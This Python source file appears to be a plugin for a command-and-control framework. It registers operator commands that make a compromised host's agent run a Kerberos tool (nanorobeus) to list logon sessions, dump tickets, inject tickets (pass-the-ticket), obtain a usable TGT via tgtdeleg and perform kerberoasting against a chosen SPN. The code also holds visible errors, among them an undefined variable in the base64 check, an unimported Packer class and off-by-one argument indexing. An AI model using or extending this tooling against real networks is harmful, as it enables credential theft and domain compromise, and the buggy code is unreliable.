from vaelix_host import Agent, RegisterCommand, RegisterModule
from os.path import exists
import re

def is_hex_number(number):
    return re.match(r'^0x[a-fA-F0-9]+$', number) is not None

def is_base64(s):
    return re.match(r'^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$', number) is not None

def luid( agentID, *param ):
    TaskID : str    = None
    agent  : Agent  = None
    packer : Packer = Packer()

    command : str   = "luid"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    agent = Agent( agentID )

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute luid" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def sessions( agentID, *param ):
    TaskID : str    = None
    agent  : Agent  = None
    packer : Packer = Packer()

    command : str   = "sessions"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    agent = Agent( agentID )

    if num_params > 2:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many arguments" )
        return
    elif num_params == 2:
        arg1 = param[ 1 ]
        arg2 = param[ 2 ]
        if arg1 != '/luid':
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return
        if not is_hex_number(arg2):
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
            return
    elif num_params == 1:
        arg1 = param[ 1 ]
        if arg1 != '/all':
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute sessions" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def klist( agentID, *param ):
    TaskID : str    = None
    agent  : Agent  = None
    packer : Packer = Packer()

    command : str   = "klist"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    agent = Agent( agentID )

    if num_params > 2:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many arguments" )
        return
    elif num_params == 2:
        arg1 = param[ 1 ]
        arg2 = param[ 2 ]
        if arg1 != '/luid':
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return
        if not is_hex_number(arg2):
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
            return
    elif num_params == 1:
        arg1 = param[ 1 ]
        if arg1 != '/all':
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute klist" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def dump( agentID, *param ):
    TaskID : str    = None
    agent  : Agent  = None
    packer : Packer = Packer()

    command : str   = "dump"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    agent = Agent( agentID )

    if num_params > 2:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many arguments" )
        return
    elif num_params == 2:
        arg1 = param[ 1 ]
        arg2 = param[ 2 ]
        if arg1 != '/luid':
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return
        if not is_hex_number(arg2):
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
            return
    elif num_params == 1:
        arg1 = param[ 1 ]
        if arg1 != '/all':
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute dump" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def ptt( agentID, *param ):
    TaskID : str    = None
    agent  : Agent  = None
    packer : Packer = Packer()

    command : str   = "ptt"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    agent = Agent( agentID )

    if num_params > 3:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many arguments" )
        return
    if num_params < 1:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough arguments" )
        return

    arg1 = param[ 1 ]
    if not is_base64(arg1):
        agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
        return

    if num_params == 2:
        arg2 = param[ 2 ]
        if arg2 != '/all':
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
            return
    elif num_params == 3:
        arg2 = param[ 2 ]
        arg3 = param[ 3 ]
        if arg2 != '/luid':
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
            return
        if not is_hex_number(arg3):
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid third argument: {arg3}" )
            return

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute ptt" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def purge( agentID, *param ):
    TaskID : str    = None
    agent  : Agent  = None
    packer : Packer = Packer()

    command : str   = "purge"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    agent = Agent( agentID )

    if num_params > 2:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many arguments" )
        return
    elif num_params == 2:
        arg1 = param[ 1 ]
        arg2 = param[ 2 ]
        if arg1 != '/luid':
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return
        if not is_hex_number(arg2):
            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
            return
    elif num_params == 1:
        arg1 = param[ 1 ]
        agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
        return

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute purge" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def tgtdeleg( agentID, *param ):
    TaskID : str    = None
    agent  : Agent  = None
    packer : Packer = Packer()

    command : str   = "tgtdeleg"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    agent = Agent( agentID )

    if num_params != 1:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "One argument must be entered" )
        return

    arg1 = param[ 1 ]

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute tgtdeleg" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def kerberoast( agentID, *param ):
    TaskID : str    = None
    agent  : Agent  = None
    packer : Packer = Packer()

    command : str   = "kerberoast"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    agent = Agent( agentID )

    if num_params != 1:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "One argument must be entered" )
        return

    arg1 = param[ 0 ]

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute kerberoast" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

#RegisterCommand( luid, "", "luid", "get current logon ID", 0, "", "" )
#RegisterCommand( klist, "", "klist", "list Kerberos tickets", 0, "[/luid <0x0> | /all]", "" )
#RegisterCommand( dump, "", "dump", "dump Kerberos tickets", 0, "[/luid <0x0> | /all]", "" )
#RegisterCommand( ptt, "", "ptt", "import Kerberos ticket into a logon session", 0, "<base64> [/luid <0x0>]", "" )
#RegisterCommand( purge, "", "purge", "purge Kerberos tickets", 0, "[/luid <0x0>]", "" )

RegisterCommand( sessions, "", "sessions", "get logon sessions", 0, "[/luid <0x0> | /all]", "" )
RegisterCommand( tgtdeleg, "", "tgtdeleg", "retrieve a usable TGT for the current user", 0, "<spn>", "" )
RegisterCommand( kerberoast, "", "kerberoast", "perform Kerberoasting against specified SPN", 0, "<spn>", "" )
